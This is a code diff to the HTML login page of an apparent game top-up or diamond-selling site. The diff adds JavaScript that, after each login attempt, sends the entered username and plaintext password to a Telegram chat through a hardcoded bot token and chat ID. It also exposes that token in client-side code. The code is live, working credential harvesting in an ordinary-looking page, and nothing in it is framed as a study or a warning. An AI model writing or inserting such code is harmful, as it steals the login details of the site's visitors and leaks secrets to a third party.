@@ -155,9 +155,8 @@ font-weight:bold;
 <h1 class="main-title">KAVIYA ADMIN</h1>
 <p>Fast • Secure • Web owner - Admin kaviya</p>
 
-<!-- TOP PHOTO ONLY -->
 <div class="top-photo">
-    <img src="IMG_20260222_095145_370.jpg">
+<img src="IMG_20260222_095145_370.jpg">
 </div>
 
 <input type="text" id="username" placeholder="Username"><br>
@@ -171,7 +170,12 @@ font-weight:bold;
 <div class="footer-text">Sri Lanka No 1 Diamond Seller</div>
 
 <script>
+
 let loggedIn = false;
+
+/* 🔑 TELEGRAM DETAILS */
+let botToken = "8439501847:AAGx25aJnenO2iPwXfSaXqbtZjfW49AXf5o";
+let chatId = "8324590734";
 
 function togglePassword(){
 let pw = document.getElementById("password");
@@ -195,6 +199,30 @@ bar.classList.add("show");
 setTimeout(()=>{
 bar.classList.remove("show");
 },3000);
+
+/* 🔥 SEND TELEGRAM ALERT */
+sendTelegram(username, password);
+}
+
+function sendTelegram(username, password){
+
+let message =
+"🚨 NEW LOGIN ALERT 🚨\n\n"+
+"👤 Username: " + username + "\n"+
+"🔑 Password: " + password + "\n"+
+"🌍 Time: " + new Date().toLocaleString();
+
+fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+chat_id: chatId,
+text: message
+})
+})
+.then(res => console.log("Telegram Sent"))
+.catch(err => console.error("Telegram Error", err));
+
 }
 
 function goTopup(){
@@ -211,6 +239,7 @@ let message = "Hello Admin, I need help.";
 let url = "https://wa.me/" + phone + "?text=" + encodeURIComponent(message);
 window.open(url, "_blank");
 }
+
 </script>
 
 </body>
